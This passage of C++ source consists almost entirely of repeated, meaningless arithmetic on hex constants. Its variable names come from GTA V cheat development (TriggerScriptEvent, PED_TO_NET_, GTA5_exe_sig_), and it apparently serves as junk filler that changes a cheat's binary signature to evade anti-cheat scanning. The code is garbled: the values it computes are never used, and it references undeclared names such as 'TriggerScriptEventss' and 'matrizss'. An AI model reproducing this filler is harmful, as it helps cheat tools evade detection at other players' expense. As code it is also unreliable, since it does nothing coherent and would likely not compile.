			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			offset = (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			TriggerScriptEvent[4] = (0xA12 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);

			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			a = 0.0f;
			b = 0.0f;
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + 0xA12;
			TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			TriggerScriptEvent[1] = (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			ifstream imput(Arquivo);
			for (string line; getline(imput, line);)
			{

				if (offset > aaaaaa)
				{
					matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
					matriz[3] = (0xB1231 * 0xA) - (ponteiro * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
					matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
					matriz[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
					matriz[7] = (0xB1231 * 0xA) + matriz[2];
					a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
					a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
				}
				else
				{
					offset = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
					offset = (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + aaaaaa;
					offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) - offset;
					offset = (0xB1231 * 0xA12) + (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - ponteiro + 0xA12;
					offset = (ponteiro * 0xA) + (matriz[2] * 0xA) - 0xBB;
					offset = (0xB1231 * 0xA) + 0xA12;
					a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
					a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
				}
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
				if (matriz[4] > 50.0f)
				{
					matriz[4] = matriz[1];
				}
				a2 = (matriz[4]) / (2 * matriz[2]);
				a1 = (matriz[3] + (2)) / (2 * matriz[2]);
				offset = (ponteiro * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (matriz[3] + (5)) / (2 * matriz[2]);
				aaaaaa = ponteiro * 2;
				a = 0.0f;
				a1 = (matriz[3] + (4)) / (2 * matriz[2]);
				b = 0.0f;
				matriz[3] = (0xB1231 * 0xA) + (ponteiro * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
				a2 = (matriz[4] + (3)) / (2 * matriz[2]);
				offset = (0xB1231 * 0xA12) + (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + ponteiro + 0xA12;
				matriz[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
				matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) + offset / (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
				matriz[4] = matriz[1];
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				offset = (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + aaaaaa;
				offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) + offset;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
				a2 = (matriz[4] + (3)) / (2 * matriz[2]);
				a2 = (matriz[4] + (2)) / (2 * matriz[2]);
				offset = (ponteiro * 0xA) + (matriz[2] * 0xA) * 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				offset = (0xB1231 * 0xA) + 0xA12;
				if (offset > aaaaaa)
				{
				}
				else
					a1 = (matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (matriz[4] - (3)) / (2 * matriz[2]);

				if (matriz[1] > aaaaaa)
				{
					matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
					matriz[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
					matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
					matriz[5] = (0xB1231 * 0xA12) + (matriz[1] * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + 0xA12;
					matriz[7] = (0xB1231 * 0xA) + matriz[2];
					a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
					a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
				}
				else
				{
					matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
					matriz[1] = (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + aaaaaa;
					matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - matriz[1];
					matriz[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
					matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) - 0xBB;
					matriz[1] = (0xB1231 * 0xA) + 0xA12;
					a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
					a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
				}
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
				a = 0.0f;
				b = 0.0f;
				if (matriz[4] > 50.0f)
				{
					matriz[4] = matriz[1];
				}
				a2 = (matriz[4]) / (2 * matriz[2]);
				a1 = (matriz[3] + (2)) / (2 * matriz[2]);
				matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (matriz[3] + (5)) / (2 * matriz[2]);
				aaaaaa = 0xB2 * 2;
				a = 0.0f;
				a1 = (matriz[3] + (4)) / (2 * matriz[2]);
				b = 0.0f;
				matriz[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
				a2 = (matriz[4] + (3)) / (2 * matriz[2]);
				matriz[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
				matriz[5] = (0xB1231 * 0xA12) + (matriz[1] + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + 0xA12;
				matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
				matriz[4] = matriz[1];
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				matriz[1] = (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + aaaaaa;
				matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + matriz[1];
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
				a2 = (matriz[4] + (3)) / (2 * matriz[2]);
				a2 = (matriz[4] + (2)) / (2 * matriz[2]);
				matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) * 0xBB;
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				if (matriz[1] > aaaaaa)
				{
				}
				else
					a1 = (matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (matriz[4] - (3)) / (2 * matriz[2]);

				if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
					GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
					GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
					GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
					GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
					GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
					a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
					a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
				}
				else
				{
					offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
					offset = (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
					offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
					offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
					offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
					offset = (0xB1231 * 0xA) + 0xA12;
					a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
					a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
				}
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
				if (GTA5_exe_sig_[4] > 50.0f)
				{
					GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
				}
				a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
				a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
				NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
				a = 0.0f;
				a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				b = 0.0f;
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
				GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				offset = (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
				a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
				a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
				offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				offset = (0xB1231 * 0xA) + 0xA12;
				if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
				}
				else
					a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);

				if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
					GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
					GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
					GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
					GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + 0xA12;
					GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
					a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
					a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
				}
				else
				{
					GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
					GTA5_exe_sig_[1] = (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
					GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
					GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
					GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
					GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
					a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
					a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
				}
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
				a = 0.0f;
				b = 0.0f;
				if (GTA5_exe_sig_[4] > 50.0f)
				{
					GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
				}
				a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
				a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
				NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
				a = 0.0f;
				a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				b = 0.0f;
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
				GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + 0xA12;
				GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				GTA5_exe_sig_[1] = (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + GTA5_exe_sig_[1];
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
				a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
				a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
				}
				else
					a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);


				if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
					TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
					TriggerScriptEvent[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
					TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
					TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
					TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
					a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
					a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
				}
				else
				{
					offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
					offset = (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
					offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
